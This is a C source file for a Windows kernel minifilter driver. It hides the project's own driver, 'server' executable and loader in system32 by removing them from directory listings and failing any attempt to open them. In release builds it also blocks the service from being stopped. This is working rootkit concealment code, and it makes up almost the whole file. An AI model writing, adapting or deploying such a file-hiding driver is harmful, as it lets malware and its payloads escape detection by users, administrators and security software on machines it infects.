#include "Driver.h"
#include <excpt.h>

/*
NOT Case Sensitive, HarddiskVolumeX will be valid for ALL volumes, so if you want a specific volume specify a specific
 number instead of X

 this doesn't seem to work on files in the volume without a subfolder, for example \Device\HarddiskVolumeX\test.

 */

UNICODE_STRING FilesToHide[] =

{
	RTL_CONSTANT_STRING(L"\\Device\\HarddiskVolumeX\\Windows\\system32\\"WIDE_DRIVER_NAME L".sys"),
	RTL_CONSTANT_STRING(L"\\Device\\HarddiskVolumeX\\Windows\\system32\\"WIDE_SERVER_NAME L".exe"),
	RTL_CONSTANT_STRING(L"\\Device\\HarddiskVolumeX\\Windows\\system32\\"WIDE_DRIVER_LOADER_NAME L".exe")
};

 

BOOLEAN FfShouldHideFilePUS(PUNICODE_STRING filePath, PWSTR fileName)


{
	NTSTATUS ntStatus = STATUS_SUCCESS;

	for (ULONGLONG i = 0; i < ARRAYSIZE(FilesToHide); i++)

	{
		WCHAR buffer[261] = { 0 };
		UNICODE_STRING dupFileToHide = { 0 };

		if (FilesToHide[i].Length > sizeof(buffer))
		{
			return FALSE;
		}

		// Initialize destination UNICODE_STRING
		dupFileToHide.Buffer = buffer;
		dupFileToHide.Length = FilesToHide[i].Length;
		dupFileToHide.MaximumLength = sizeof(buffer);

		// Copy the buffer 
		RtlCopyMemory(dupFileToHide.Buffer, FilesToHide[i].Buffer, FilesToHide[i].Length);

		ntStatus = FfInsertHarddiskVolumeNumber(&dupFileToHide, filePath);

		if (!NT_SUCCESS(ntStatus))
		{
			DBGERRORNTSTATUS("FfInsertHarddiskVolumeNumber", ntStatus);

			return FALSE;
		}

		if(UCompareCombinedUnicodeStringWithMiddleCharAndStringToUnicodeString(filePath, L'\\', fileName, &dupFileToHide))
		{
			return TRUE;
		}
	}


	return FALSE;
}

BOOLEAN FfShouldHideFilePUSFullPath(PUNICODE_STRING fullFilePath)


{
	NTSTATUS ntStatus = STATUS_SUCCESS;

	for (ULONGLONG i = 0; i < ARRAYSIZE(FilesToHide); i++)

	{
		WCHAR buffer[261] = { 0 };
		UNICODE_STRING dupFileToHide = { 0 };

		if (FilesToHide[i].Length > sizeof(buffer))
		{
			return FALSE;
		}

		// Initialize destination UNICODE_STRING
		dupFileToHide.Buffer = buffer;
		dupFileToHide.Length = FilesToHide[i].Length;
		dupFileToHide.MaximumLength = sizeof(buffer);

		// Copy the buffer 
		RtlCopyMemory(dupFileToHide.Buffer, FilesToHide[i].Buffer, FilesToHide[i].Length);

		ntStatus = FfInsertHarddiskVolumeNumber(&dupFileToHide, fullFilePath);

		if (!NT_SUCCESS(ntStatus))
		{
			DBGERRORNTSTATUS("FfInsertHarddiskVolumeNumber", ntStatus);

			return FALSE;
		}

		if (RtlCompareUnicodeString(&dupFileToHide, fullFilePath, TRUE) == 0) 
		{
			return TRUE;
		}
	}


	return FALSE;
}

BOOLEAN FfShouldHideFilePWC(PWCH fileNameToCheck)
{

	for (ULONGLONG i = 0; i < ARRAYSIZE(FilesToHide); i++)

	{
		if ((wcslen(fileNameToCheck) * sizeof(WCHAR)) != FilesToHide[i].Length)
		{
			continue;
		}

		if (memcmp(fileNameToCheck, FilesToHide[i].Buffer, FilesToHide[i].Length) == 0)
		{
			return TRUE;
		}
	}

	return FALSE;
}

NTSTATUS FfInsertHarddiskVolumeNumber(PUNICODE_STRING filePathToInsertVolumeNumber, PUNICODE_STRING filePathWithVolumeNumber)
{
	
	SIZE_T startStringLen = strlen("\\Device\\HarddiskVolumeX");

	if ((filePathToInsertVolumeNumber->Length < startStringLen) || (filePathWithVolumeNumber->Length < startStringLen))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if(	UStartsWith(filePathToInsertVolumeNumber, L"\\Device\\HarddiskVolumeX")
		&&
		UStartsWith(filePathWithVolumeNumber, L"\\Device\\HarddiskVolume")
		)
	{

		(filePathToInsertVolumeNumber->Buffer)[startStringLen - 1] = (filePathWithVolumeNumber->Buffer)[startStringLen - 1];
		
		return STATUS_SUCCESS;
	}


	return STATUS_UNSUCCESSFUL;
}

NTSTATUS FfSkipFileDirectoryInformationEntries(PFILE_DIRECTORY_INFORMATION pCurrentFileDirInfo, PFLT_FILE_NAME_INFORMATION pFileNameInfo, ULONG bufferLength)

{

	PFILE_DIRECTORY_INFORMATION pPreviousFileDirInfo = NULL;
	PFILE_DIRECTORY_INFORMATION pNextFileDirInfo = NULL;

	// this points to the first byte outside of the list buffer
	PUINT8 endOfListAddress = ((PUINT8)pCurrentFileDirInfo + bufferLength);

	// We do not support long file names, this should not be a problem 
	// THIS IS ACTUALLY A WCHAR BUFFER WE JUST AVOID DIVISION
	UINT8 fileNameBuffer[261 * sizeof(WCHAR)];

	// The algorithm
	do
	{
		BOOLEAN updateEntries = TRUE;

		// Create a pointer to the next list entry
		pNextFileDirInfo = (PFILE_DIRECTORY_INFORMATION)((PUINT8)pCurrentFileDirInfo + pCurrentFileDirInfo->NextEntryOffset);

		// Zero buffer for null terminator
		memset(fileNameBuffer, 0, sizeof(fileNameBuffer));
		// Copy the string into it
		memcpy_s(fileNameBuffer, sizeof(fileNameBuffer), pCurrentFileDirInfo->FileName, pCurrentFileDirInfo->FileNameLength);

		// Check if the current entry should be hidden
		if (FfShouldHideFilePUS(&pFileNameInfo->Name, (PWCH)fileNameBuffer))
		{
			DBGINFO("Found entry to hide: %wZ\\%ls", &pFileNameInfo->Name, (PWCH)fileNameBuffer);

			// Check if the current entry is the last one
			if (pCurrentFileDirInfo->NextEntryOffset == 0)
			{
				// Check if the current entry also is the only one
				if (pPreviousFileDirInfo == NULL)
				{
					return STATUS_NO_MORE_ENTRIES;
				}

				// The current entry is the last one and should be hidden, so just make the previous one the last one
				pPreviousFileDirInfo->NextEntryOffset = 0;
				return STATUS_SUCCESS;
			}

			// Temporarily store the current next entry offset for the endOfListAddress calculation as memmove messes up pCurrentFileDirInfo
			LONG tempNextEntryOffset = pCurrentFileDirInfo->NextEntryOffset;

			// Set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileDirInfo = pCurrentFileDirInfo;

			// Move the memory from the next list entry until the end of the list to the position of the current entry to overwrite it
			memmove(pCurrentFileDirInfo, pNextFileDirInfo, (size_t)(endOfListAddress - (PUINT8)pNextFileDirInfo));

			// Subtract the size of the current list entry we overwrote from the pointer pointing to the end of the list
			endOfListAddress -= tempNextEntryOffset;

			// Don't update the previous and current list entry at the end of the loop, we've already done that here
			updateEntries = FALSE;

		}

		if (updateEntries)
		{
			// At the end of the loop iteration, set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileDirInfo = pCurrentFileDirInfo;

			// Finally, update the current list entry pointer to point to the next entry
			pCurrentFileDirInfo = pNextFileDirInfo;
		}


	} while (pPreviousFileDirInfo->NextEntryOffset != 0);

	return STATUS_SUCCESS;
}

NTSTATUS FfSkipFileFullDirectoryInformationEntries(PFILE_FULL_DIR_INFORMATION pCurrentFileFullDirInfo, PFLT_FILE_NAME_INFORMATION pFileNameInfo, ULONG bufferLength)

{
	PFILE_FULL_DIR_INFORMATION pPreviousFileFullDirInfo = NULL;
	PFILE_FULL_DIR_INFORMATION pNextFileFullDirInfo = NULL;

	// this points to the first byte outside of the list buffer
	PUINT8 endOfListAddress = ((PUINT8)pCurrentFileFullDirInfo + bufferLength);

	// We do not support long file names, this should not be a problem 
	// THIS IS ACTUALLY A WCHAR BUFFER WE JUST AVOID DIVISION
	UINT8 fileNameBuffer[261 * sizeof(WCHAR)];

	// The algorithm
	do
	{	
		BOOLEAN updateEntries = TRUE;

		// Create a pointer to the next list entry
		pNextFileFullDirInfo = (PFILE_FULL_DIR_INFORMATION)((PUINT8)pCurrentFileFullDirInfo + pCurrentFileFullDirInfo->NextEntryOffset);

		// Zero buffer for null terminator
		memset(fileNameBuffer, 0, sizeof(fileNameBuffer));
		// Copy the string into it
		memcpy_s(fileNameBuffer, sizeof(fileNameBuffer), pCurrentFileFullDirInfo->FileName, pCurrentFileFullDirInfo->FileNameLength);

		// Check if the current entry should be hidden
		if (FfShouldHideFilePUS(&pFileNameInfo->Name, (PWCH)fileNameBuffer))
		{
			DBGINFO("Found entry to hide: %wZ\\%ls", &pFileNameInfo->Name, (PWCH)fileNameBuffer);

			// Check if the current entry is the last one
			if (pCurrentFileFullDirInfo->NextEntryOffset == 0)
			{
				// Check if the current entry also is the only one
				if (pPreviousFileFullDirInfo == NULL)
				{
					return STATUS_NO_MORE_ENTRIES;
				}

				// The current entry is the last one and should be hidden, so just make the previous one the last one
				pPreviousFileFullDirInfo->NextEntryOffset = 0; 
				return STATUS_SUCCESS;
			}

			// Temporarily store the current next entry offset for the endOfListAddress calculation as memmove messes up pCurrentFileFullDirInfo
			LONG tempNextEntryOffset = pCurrentFileFullDirInfo->NextEntryOffset;

			// Set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileFullDirInfo = pCurrentFileFullDirInfo;

			// Move the memory from the next list entry until the end of the list to the position of the current entry to overwrite it
			memmove(pCurrentFileFullDirInfo, pNextFileFullDirInfo, (size_t)(endOfListAddress - (PUINT8)pNextFileFullDirInfo));

			// Subtract the size of the current list entry we overwrote from the pointer pointing to the end of the list
			endOfListAddress -= tempNextEntryOffset;

			// Don't update the previous and current list entry at the end of the loop, we've already done that here
			updateEntries = FALSE;

		}

		if (updateEntries)
		{
			// At the end of the loop iteration, set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileFullDirInfo = pCurrentFileFullDirInfo;

			// Finally, update the current list entry pointer to point to the next entry
			pCurrentFileFullDirInfo = pNextFileFullDirInfo;
		}


	} while (pPreviousFileFullDirInfo->NextEntryOffset != 0);


	return STATUS_SUCCESS;

}

NTSTATUS FfSkipFileBothDirectoryInformationEntries(PFILE_BOTH_DIR_INFORMATION pCurrentFileBothDirInfo, PFLT_FILE_NAME_INFORMATION pFileNameInfo, ULONG bufferLength)

{
	PFILE_BOTH_DIR_INFORMATION pPreviousFileBothDirInfo = NULL;
	PFILE_BOTH_DIR_INFORMATION pNextFileBothDirInfo = NULL;

	// this points to the first byte outside of the list buffer
	PUINT8 endOfListAddress = ((PUINT8)pCurrentFileBothDirInfo + bufferLength);

	// We do not support long file names, this should not be a problem 
	// THIS IS ACTUALLY A WCHAR BUFFER WE JUST AVOID DIVISION
	UINT8 fileNameBuffer[261 * sizeof(WCHAR)];

	// The algorithm
	do
	{
		BOOLEAN updateEntries = TRUE;

		// Create a pointer to the next list entry
		pNextFileBothDirInfo = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)pCurrentFileBothDirInfo + pCurrentFileBothDirInfo->NextEntryOffset);

		// Zero buffer for null terminator
		memset(fileNameBuffer, 0, sizeof(fileNameBuffer));
		// Copy the string into it
		memcpy_s(fileNameBuffer, sizeof(fileNameBuffer), pCurrentFileBothDirInfo->FileName, pCurrentFileBothDirInfo->FileNameLength);

		// Check if the current entry should be hidden
		if (FfShouldHideFilePUS(&pFileNameInfo->Name, (PWCH)fileNameBuffer))
		{
			DBGINFO("Found entry to hide: %wZ\\%ls", &pFileNameInfo->Name, (PWCH)fileNameBuffer);

			// Check if the current entry is the last one
			if (pCurrentFileBothDirInfo->NextEntryOffset == 0)
			{
				// Check if the current entry also is the only one
				if (pPreviousFileBothDirInfo == NULL)
				{
					return STATUS_NO_MORE_ENTRIES;
				}

				// The current entry is the last one and should be hidden, so just make the previous one the last one
				pPreviousFileBothDirInfo->NextEntryOffset = 0;
				return STATUS_SUCCESS;
			}

			// Temporarily store the current next entry offset for the endOfListAddress calculation as memmove messes up pCurrentFileBothDirInfo
			LONG tempNextEntryOffset = pCurrentFileBothDirInfo->NextEntryOffset;

			// Set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileBothDirInfo = pCurrentFileBothDirInfo;

			// Move the memory from the next list entry until the end of the list to the position of the current entry to overwrite it
			memmove(pCurrentFileBothDirInfo, pNextFileBothDirInfo, (size_t)(endOfListAddress - (PUINT8)pNextFileBothDirInfo));

			// Subtract the size of the current list entry we overwrote from the pointer pointing to the end of the list
			endOfListAddress -= tempNextEntryOffset;

			// Don't update the previous and current list entry at the end of the loop, we've already done that here
			updateEntries = FALSE;

		}

		if (updateEntries)
		{
			// At the end of the loop iteration, set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileBothDirInfo = pCurrentFileBothDirInfo;

			// Finally, update the current list entry pointer to point to the next entry
			pCurrentFileBothDirInfo = pNextFileBothDirInfo;
		}


	} while (pPreviousFileBothDirInfo->NextEntryOffset != 0);

	return STATUS_SUCCESS;
}

NTSTATUS FfSkipFileNamesInformationEntries(PFILE_NAMES_INFORMATION pCurrentFileNamesInfo, PFLT_FILE_NAME_INFORMATION pFileNameInfo, ULONG bufferLength)
{
	PFILE_NAMES_INFORMATION pPreviousFileNamesInfo = NULL;
	PFILE_NAMES_INFORMATION pNextFileNamesInfo = NULL;

	// this points to the first byte outside of the list buffer
	PUINT8 endOfListAddress = ((PUINT8)pCurrentFileNamesInfo + bufferLength);

	// We do not support long file names, this should not be a problem 
	// THIS IS ACTUALLY A WCHAR BUFFER WE JUST AVOID DIVISION
	UINT8 fileNameBuffer[261 * sizeof(WCHAR)];

	// The algorithm
	do
	{
		BOOLEAN updateEntries = TRUE;

		// Create a pointer to the next list entry
		pNextFileNamesInfo = (PFILE_NAMES_INFORMATION)((PUINT8)pCurrentFileNamesInfo + pCurrentFileNamesInfo->NextEntryOffset);

		// Zero buffer for null terminator
		memset(fileNameBuffer, 0, sizeof(fileNameBuffer));
		// Copy the string into it
		memcpy_s(fileNameBuffer, sizeof(fileNameBuffer), pCurrentFileNamesInfo->FileName, pCurrentFileNamesInfo->FileNameLength);

		// Check if the current entry should be hidden
		if (FfShouldHideFilePUS(&pFileNameInfo->Name, (PWCH)fileNameBuffer))
		{
			DBGINFO("Found entry to hide: %wZ\\%ls", &pFileNameInfo->Name, (PWCH)fileNameBuffer);

			// Check if the current entry is the last one
			if (pCurrentFileNamesInfo->NextEntryOffset == 0)
			{
				// Check if the current entry also is the only one
				if (pPreviousFileNamesInfo == NULL)
				{
					return STATUS_NO_MORE_ENTRIES;
				}

				// The current entry is the last one and should be hidden, so just make the previous one the last one
				pPreviousFileNamesInfo->NextEntryOffset = 0;
				return STATUS_SUCCESS;
			}

			// Temporarily store the current next entry offset for the endOfListAddress calculation as memmove messes up pCurrentFileNamesInfo
			LONG tempNextEntryOffset = pCurrentFileNamesInfo->NextEntryOffset;

			// Set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileNamesInfo = pCurrentFileNamesInfo;

			// Move the memory from the next list entry until the end of the list to the position of the current entry to overwrite it
			memmove(pCurrentFileNamesInfo, pNextFileNamesInfo, (size_t)(endOfListAddress - (PUINT8)pNextFileNamesInfo));

			// Subtract the size of the current list entry we overwrote from the pointer pointing to the end of the list
			endOfListAddress -= tempNextEntryOffset;

			// Don't update the previous and current list entry at the end of the loop, we've already done that here
			updateEntries = FALSE;

		}

		if (updateEntries)
		{
			// At the end of the loop iteration, set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileNamesInfo = pCurrentFileNamesInfo;

			// Finally, update the current list entry pointer to point to the next entry
			pCurrentFileNamesInfo = pNextFileNamesInfo;
		}


	} while (pPreviousFileNamesInfo->NextEntryOffset != 0);

	return STATUS_SUCCESS;
}

NTSTATUS FfSkipFileIdBothDirectoryInformationEntries(PFILE_ID_BOTH_DIR_INFORMATION pCurrentFileIdBothDirInfo, PFLT_FILE_NAME_INFORMATION pFileNameInfo, ULONG bufferLength)

{
	PFILE_ID_BOTH_DIR_INFORMATION pPreviousFileIdBothDirInfo = NULL;
	PFILE_ID_BOTH_DIR_INFORMATION pNextFileIdBothDirInfo = NULL;

	// this points to the first byte outside of the list buffer
	PUINT8 endOfListAddress = ((PUINT8)pCurrentFileIdBothDirInfo + bufferLength);

	// We do not support long file names, this should not be a problem 
	// THIS IS ACTUALLY A WCHAR BUFFER WE JUST AVOID DIVISION
	UINT8 fileNameBuffer[261 * sizeof(WCHAR)];

	// The algorithm
	do
	{
		BOOLEAN updateEntries = TRUE;

		// Create a pointer to the next list entry
		pNextFileIdBothDirInfo = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)pCurrentFileIdBothDirInfo + pCurrentFileIdBothDirInfo->NextEntryOffset);

		// Zero buffer for null terminator
		memset(fileNameBuffer, 0, sizeof(fileNameBuffer));
		// Copy the string into it
		memcpy_s(fileNameBuffer, sizeof(fileNameBuffer), pCurrentFileIdBothDirInfo->FileName, pCurrentFileIdBothDirInfo->FileNameLength);

		// Check if the current entry should be hidden
		if (FfShouldHideFilePUS(&pFileNameInfo->Name, (PWCH)fileNameBuffer))
		{
			DBGINFO("Found entry to hide: %wZ\\%ls", &pFileNameInfo->Name, (PWCH)fileNameBuffer);

			// Check if the current entry is the last one
			if (pCurrentFileIdBothDirInfo->NextEntryOffset == 0)
			{
				// Check if the current entry also is the only one
				if (pPreviousFileIdBothDirInfo == NULL)
				{
					return STATUS_NO_MORE_ENTRIES;
				}

				// The current entry is the last one and should be hidden, so just make the previous one the last one
				pPreviousFileIdBothDirInfo->NextEntryOffset = 0;
				return STATUS_SUCCESS;
			}

			// Temporarily store the current next entry offset for the endOfListAddress calculation as memmove messes up pCurrentFileIdBothDirInfo
			LONG tempNextEntryOffset = pCurrentFileIdBothDirInfo->NextEntryOffset;

			// Set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileIdBothDirInfo = pCurrentFileIdBothDirInfo;

			// Move the memory from the next list entry until the end of the list to the position of the current entry to overwrite it
			memmove(pCurrentFileIdBothDirInfo, pNextFileIdBothDirInfo, (size_t)(endOfListAddress - (PUINT8)pNextFileIdBothDirInfo));

			// Subtract the size of the current list entry we overwrote from the pointer pointing to the end of the list
			endOfListAddress -= tempNextEntryOffset;

			// Don't update the previous and current list entry at the end of the loop, we've already done that here
			updateEntries = FALSE;

		}

		if (updateEntries)
		{
			// At the end of the loop iteration, set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileIdBothDirInfo = pCurrentFileIdBothDirInfo;

			// Finally, update the current list entry pointer to point to the next entry
			pCurrentFileIdBothDirInfo = pNextFileIdBothDirInfo;
		}


	} while (pPreviousFileIdBothDirInfo->NextEntryOffset != 0);

	return STATUS_SUCCESS;
}

NTSTATUS FfSkipFileIdFullDirectoryInformationEntries(PFILE_ID_FULL_DIR_INFORMATION pCurrentFileIdFullDirInfo, PFLT_FILE_NAME_INFORMATION pFileNameInfo, ULONG bufferLength)
{
	PFILE_ID_FULL_DIR_INFORMATION pPreviousFileIdFullDirInfo = NULL;
	PFILE_ID_FULL_DIR_INFORMATION pNextFileIdFullDirInfo = NULL;

	// this points to the first byte outside of the list buffer
	PUINT8 endOfListAddress = ((PUINT8)pCurrentFileIdFullDirInfo + bufferLength);

	// We do not support long file names, this should not be a problem 
	// THIS IS ACTUALLY A WCHAR BUFFER WE JUST AVOID DIVISION
	UINT8 fileNameBuffer[261 * sizeof(WCHAR)];

	// The algorithm
	do
	{
		BOOLEAN updateEntries = TRUE;

		// Create a pointer to the next list entry
		pNextFileIdFullDirInfo = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)pCurrentFileIdFullDirInfo + pCurrentFileIdFullDirInfo->NextEntryOffset);

		// Zero buffer for null terminator
		memset(fileNameBuffer, 0, sizeof(fileNameBuffer));
		// Copy the string into it
		memcpy_s(fileNameBuffer, sizeof(fileNameBuffer), pCurrentFileIdFullDirInfo->FileName, pCurrentFileIdFullDirInfo->FileNameLength);

		// Check if the current entry should be hidden
		if (FfShouldHideFilePUS(&pFileNameInfo->Name, (PWCH)fileNameBuffer))
		{
			DBGINFO("Found entry to hide: %wZ\\%ls", &pFileNameInfo->Name, (PWCH)fileNameBuffer);

			// Check if the current entry is the last one
			if (pCurrentFileIdFullDirInfo->NextEntryOffset == 0)
			{
				// Check if the current entry also is the only one
				if (pPreviousFileIdFullDirInfo == NULL)
				{
					return STATUS_NO_MORE_ENTRIES;
				}

				// The current entry is the last one and should be hidden, so just make the previous one the last one
				pPreviousFileIdFullDirInfo->NextEntryOffset = 0;
				return STATUS_SUCCESS;
			}

			// Temporarily store the current next entry offset for the endOfListAddress calculation as memmove messes up pCurrentFileIdFullDirInfo
			LONG tempNextEntryOffset = pCurrentFileIdFullDirInfo->NextEntryOffset;

			// Set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileIdFullDirInfo = pCurrentFileIdFullDirInfo;

			// Move the memory from the next list entry until the end of the list to the position of the current entry to overwrite it
			memmove(pCurrentFileIdFullDirInfo, pNextFileIdFullDirInfo, (size_t)(endOfListAddress - (PUINT8)pNextFileIdFullDirInfo));

			// Subtract the size of the current list entry we overwrote from the pointer pointing to the end of the list
			endOfListAddress -= tempNextEntryOffset;

			// Don't update the previous and current list entry at the end of the loop, we've already done that here
			updateEntries = FALSE;

		}

		if (updateEntries)
		{
			// At the end of the loop iteration, set the previous list entry to the current one to keep track of it in the next iteration
			pPreviousFileIdFullDirInfo = pCurrentFileIdFullDirInfo;

			// Finally, update the current list entry pointer to point to the next entry
			pCurrentFileIdFullDirInfo = pNextFileIdFullDirInfo;
		}


	} while (pPreviousFileIdFullDirInfo->NextEntryOffset != 0);

	return STATUS_SUCCESS;
}




FLT_PREOP_CALLBACK_STATUS FfCreatePreOperationCallback(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext)
{
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PFLT_FILE_NAME_INFORMATION pFileNameInfo;

	/*
	I tried implementing a check if the current I/O is on a directory, but it didnt work
	neither with flag checking or FltIsDirectory so just dont specify directories in the filter list and it will be fin
	*/


	ntStatus = FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED, &pFileNameInfo);

	if (!NT_SUCCESS(ntStatus))
	{
		// These errors are common and happen a lot (maybe for symbolic links or reparse points idk) so we ignore them
		if (ntStatus != STATUS_OBJECT_PATH_NOT_FOUND && ntStatus != STATUS_OBJECT_NAME_INVALID)
		{
			DBGERRORNTSTATUS("FltGetFileNameInformation", ntStatus);
		}

		return FLT_PREOP_SUCCESS_NO_CALLBACK;
	}


	if (FfShouldHideFilePUSFullPath(&pFileNameInfo->Name))
	{
		DBGINFO("Filtering I/O on %wZ", &pFileNameInfo->Name);

		Data->IoStatus.Status = STATUS_NO_SUCH_FILE;
		return FLT_PREOP_COMPLETE;

	}

	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS FfDirectoryControlPostOperationCallback(
	PFLT_CALLBACK_DATA data,
	PCFLT_RELATED_OBJECTS fltObjects,
	PVOID completionContext,
	FLT_POST_OPERATION_FLAGS flags)


{

	NTSTATUS ioNtStatus = STATUS_SUCCESS;
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PFLT_FILE_NAME_INFORMATION pFileNameInfo;

	// It took me over a day of debugging to find out this is required
	if (!NT_SUCCESS(data->IoStatus.Status))
	{
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	// Filter out IRPs that aren't IRP_MN_QUERY_DIRECTORY
	if (data->Iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY)
	{
		return FLT_POSTOP_FINISHED_PROCESSING;
	}


	ntStatus = FltGetFileNameInformation(data, FLT_FILE_NAME_NORMALIZED, &pFileNameInfo);
	
	if (!NT_SUCCESS(ntStatus))
	{
		if (ntStatus != STATUS_OBJECT_PATH_NOT_FOUND && ntStatus != STATUS_OBJECT_NAME_INVALID)
		{
			DBGERRORNTSTATUS("FltGetFileNameInformation", ntStatus);
		}

		return FLT_POSTOP_FINISHED_PROCESSING;
	}

	

	FILE_INFORMATION_CLASS fileInformationClass = data->Iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass;

	PVOID directoryBuffer = data->Iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;

	ULONG bufferLength = data->Iopb->Parameters.DirectoryControl.QueryDirectory.Length;

	switch (fileInformationClass)
	{

		case FileDirectoryInformation:

			ioNtStatus = FfSkipFileDirectoryInformationEntries((PFILE_DIRECTORY_INFORMATION)directoryBuffer, pFileNameInfo, bufferLength);
			break;

		case FileFullDirectoryInformation:

			ioNtStatus = FfSkipFileFullDirectoryInformationEntries((PFILE_FULL_DIR_INFORMATION)directoryBuffer, pFileNameInfo, bufferLength);
			break;

		case FileBothDirectoryInformation:

			ioNtStatus = FfSkipFileBothDirectoryInformationEntries((PFILE_BOTH_DIR_INFORMATION)directoryBuffer, pFileNameInfo, bufferLength);
			break;

		case FileNamesInformation:

			ioNtStatus = FfSkipFileNamesInformationEntries((PFILE_NAMES_INFORMATION)directoryBuffer, pFileNameInfo, bufferLength);
			break;
		
		case FileIdBothDirectoryInformation: 

			ioNtStatus = FfSkipFileIdBothDirectoryInformationEntries((PFILE_ID_BOTH_DIR_INFORMATION)directoryBuffer, pFileNameInfo, bufferLength);
			break;

		case FileIdFullDirectoryInformation:

			ioNtStatus = FfSkipFileIdFullDirectoryInformationEntries((PFILE_ID_FULL_DIR_INFORMATION)directoryBuffer, pFileNameInfo, bufferLength);
			break;

		default:
			break;
	}

	data->IoStatus.Status = ioNtStatus;

	return FLT_POSTOP_FINISHED_PROCESSING;
}



// Filter cleanup is done in DriverUnload
NTSTATUS PfltFilterUnloadCallback(FLT_FILTER_UNLOAD_FLAGS flags)
{
	return STATUS_SUCCESS;
}


VOID FfUnregisterFileFilter(PFLT_FILTER pFltFilter)
{
	FltUnregisterFilter(pFltFilter);
}

NTSTATUS FfRegisterFileFilter(PDRIVER_OBJECT pDriverObject, PFLT_FILTER* pFltFilter)
{
	NTSTATUS returnStatus = STATUS_SUCCESS;

	const FLT_OPERATION_REGISTRATION filterCallbacks[] =
	{

		{ IRP_MJ_CREATE/*MajorFunction*/, 0 /*Flags*/, FfCreatePreOperationCallback /*PreOperation*/, NULL /*PostOperation*/, NULL /*Reserved1*/},
		{ IRP_MJ_DIRECTORY_CONTROL/*MajorFunction*/, 0 /*Flags*/, NULL /*PreOperation*/, FfDirectoryControlPostOperationCallback /*PostOperation*/, NULL /*Reserved1*/},
		{ IRP_MJ_OPERATION_END } // End
	};


	const FLT_REGISTRATION fltRegistration =
	{
			sizeof(FLT_REGISTRATION),						// Size
			FLT_REGISTRATION_VERSION,						// Version
#ifndef DEBUG 
			FLTFL_REGISTRATION_DO_NOT_SUPPORT_SERVICE_STOP,	// Flags for non-debug builds
#else		
			0,												// Flags
#endif														
			NULL,											// ContextRegistration
			filterCallbacks,								// OperationRegistration
			PfltFilterUnloadCallback,						// FilterUnloadCallback
			NULL,											// InstanceSetupCallback
			NULL,											// InstanceQueryTeardownCallback
			NULL,											// InstanceTeardownStartCallback
			NULL,											// InstanceTeardownCompleteCallback
			NULL,											// GenerateFileNameCallback
			NULL,											// NormalizeNameComponentCallback
			NULL,											// NormalizeContextCleanupCallback
			NULL,											// TransactionNotificationCallback
			NULL,											// NormalizeNameComponentExCallback
			NULL											// SectionNotificationCallback
	};


	returnStatus = FltRegisterFilter(pDriverObject, &fltRegistration, pFltFilter);

	if (!NT_SUCCESS(returnStatus))
	{
		DBGERRORNTSTATUS("FltRegisterFilter", returnStatus);
		return returnStatus;
	}

	returnStatus = FltStartFiltering(*pFltFilter);

	if (!NT_SUCCESS(returnStatus))
	{
		DBGERRORNTSTATUS("FltStartFiltering", returnStatus);
	}

	return returnStatus;
}


